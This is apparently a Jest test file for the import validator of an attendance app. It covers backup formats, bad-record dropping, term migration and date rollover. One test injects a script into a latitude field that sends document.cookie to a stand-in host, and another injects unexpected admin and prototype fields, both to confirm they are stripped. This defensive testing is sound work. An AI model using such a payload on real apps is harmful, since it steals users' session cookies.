import { describe, test, expect, afterEach } from '@jest/globals';
import { validateAppData, LIMITS } from '../src/cloud/validate';
import * as logic from '../src/logic';

const good = () => ({
  subjects: [{ id: 's1', name: 'Physics', color: '#16A34A', active: true, target: 80 }],
  slots: [{ id: 'sl1', subjectId: 's1', day: 1, start: '10:00', end: '10:55', room: 'R1', lat: 22.5, lng: 88.3, radius: 100, active: true }],
  records: [{ id: 'r1', slotId: 'sl1', subjectId: 's1', date: '2026-11-23', scheduledStart: '10:00', status: 'present' }],
  settings: { target: 75, countCancelled: false, themePref: 'dark' },
});

describe('validateAppData', () => {
  test('accepts good data unchanged', () => {
    const res = validateAppData(good());
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.dropped).toBe(0);
    expect(res.data.subjects[0]).toEqual({ ...good().subjects[0], termId: 'term-1' });   // migrated into Term 1
    expect(res.data.slots[0].lat).toBe(22.5);
    expect(res.data.settings.themePref).toBe('dark');
  });

  test('accepts the v2 backup wrapper and legacy flat files', () => {
    expect(validateAppData({ app: 'attendly', schemaVersion: 2, data: good() }).ok).toBe(true);
    expect(validateAppData({ app: 'bunksmart', version: 1, ...good() }).ok).toBe(true);
  });

  test('rejects things that are not Attendly data', () => {
    expect(validateAppData(null).ok).toBe(false);
    expect(validateAppData('hello').ok).toBe(false);
    expect(validateAppData({ subjects: 'nope' }).ok).toBe(false);
    expect(validateAppData([]).ok).toBe(false);
  });

  test('drops bad entries and counts them', () => {
    const d: any = good();
    d.records.push({ id: 'r2', slotId: 'sl1', subjectId: 's1', date: '2026-02-30', scheduledStart: '10:00', status: 'present' }); // impossible date
    d.records.push({ id: 'r3', slotId: 'sl1', subjectId: 's1', date: '2026-11-20', scheduledStart: '10:00', status: 'hacked' });   // unknown status
    d.records.push({ id: 'r1', slotId: 'sl1', subjectId: 's1', date: '2026-11-21', scheduledStart: '10:00', status: 'absent' });  // duplicate id
    d.slots.push({ id: 'sl2', subjectId: 'ghost', day: 2, start: '09:00', end: '10:00' });                                         // unknown subject
    const res = validateAppData(d);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.data.records).toHaveLength(1);
    expect(res.data.slots).toHaveLength(1);
    expect(res.dropped).toBe(4);
  });

  test('script in a coordinate never survives (map WebView safety)', () => {
    const d: any = good();
    d.slots[0].lat = '0);fetch("https://evil.example/"+document.cookie);//';
    const res = validateAppData(d);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.data.slots[0].lat).toBeNull();
    expect(res.data.slots[0].lng).toBeNull();          // location dropped as a pair, class kept
  });

  test('unknown fields are not copied through', () => {
    const d: any = good();
    d.subjects[0].__proto__polluted = true;
    d.settings.isAdmin = true;
    const res = validateAppData(d);
    if (!res.ok) throw new Error('expected ok');
    expect(Object.keys(res.data.subjects[0]).sort()).toEqual(['active', 'color', 'id', 'name', 'target', 'termId']);
    expect((res.data.settings as any).isAdmin).toBeUndefined();
  });

  test('bad settings fall back to defaults', () => {
    const d: any = good();
    d.settings = { target: 500, roundingRule: 'banana', termStart: 'yesterday' };
    const res = validateAppData(d);
    if (!res.ok) throw new Error('expected ok');
    expect(res.data.settings.target).toBe(75);
    expect(res.data.settings.roundingRule).toBe('round');
    expect(res.data.settings.termStart).toBeUndefined();
  });

  test('oversized files are refused', () => {
    const d: any = good();
    d.records = Array.from({ length: LIMITS.records + 1 }, (_, i) => ({ ...good().records[0], id: 'r' + i }));
    expect(validateAppData(d).ok).toBe(false);
  });
});

describe('refreshToday (midnight rollover)', () => {
  afterEach(() => { logic.refreshToday(new Date()); });
  test('moves TODAY forward and reports the change once', () => {
    const tomorrow = new Date(); tomorrow.setDate(tomorrow.getDate() + 1);
    expect(logic.refreshToday(tomorrow)).toBe(true);
    expect(logic.TODAY).toBe(logic.isoDate(tomorrow));
    expect(logic.TODAY_DOW).toBe(tomorrow.getDay());
    expect(logic.refreshToday(tomorrow)).toBe(false);
  });
});

describe('migration to terms', () => {
  const old = () => ({
    subjects: [{ id: 's1', name: 'Physics', color: '#16A34A', active: true }],
    slots: [],
    records: [
      { id: 'r1', slotId: 'x', subjectId: 's1', date: '2026-08-03', scheduledStart: '10:00', status: 'present' },
      { id: 'r2', slotId: 'x', subjectId: 's1', date: '2026-11-20', scheduledStart: '10:00', status: 'absent' },
    ],
    settings: { target: 75, termStart: '2026-07-20', termEnd: '2026-11-30' },
  });
  test('data from before terms becomes one "Term 1" with every subject in it', () => {
    const res = validateAppData(old());
    if (!res.ok) throw new Error('expected ok');
    expect(res.data.terms).toEqual([{ id: 'term-1', name: 'Term 1', start: '2026-07-20', end: '2026-11-30' }]);
    expect(res.data.subjects[0].termId).toBe('term-1');
    expect(res.data.activeTermId).toBe('term-1');
    expect(res.data.settings.termStart).toBeUndefined();   // dates now live on the term
  });
  test('without old term dates, the term spans the records', () => {
    const d: any = old(); d.settings = { target: 75 };
    const res = validateAppData(d);
    if (!res.ok) throw new Error('expected ok');
    expect(res.data.terms[0].start).toBe('2026-08-03');
    expect(res.data.terms[0].end >= '2026-11-20').toBe(true);
  });
  test('every device migrates the same data identically (no sync conflict)', () => {
    expect(JSON.stringify(validateAppData(old()))).toBe(JSON.stringify(validateAppData(old())));
  });
  test('subjects pointing at a missing term join the latest term', () => {
    const d: any = { ...old(), terms: [{ id: 'a', name: 'A', start: '2026-01-01', end: '2026-05-31' }, { id: 'b', name: 'B', start: '2026-07-01', end: '2026-12-31' }] };
    d.subjects[0].termId = 'ghost';
    const res = validateAppData(d);
    if (!res.ok) throw new Error('expected ok');
    expect(res.data.subjects[0].termId).toBe('b');
  });
  test('broken terms are dropped', () => {
    const d: any = { ...old(), terms: [{ id: 'a', name: 'A', start: '2026-09-01', end: '2026-01-01' }, { id: 'b', name: 'B', start: '2026-07-01', end: '2026-12-31' }] };
    const res = validateAppData(d);
    if (!res.ok) throw new Error('expected ok');
    expect(res.data.terms.map(t => t.id)).toEqual(['b']);
  });
});
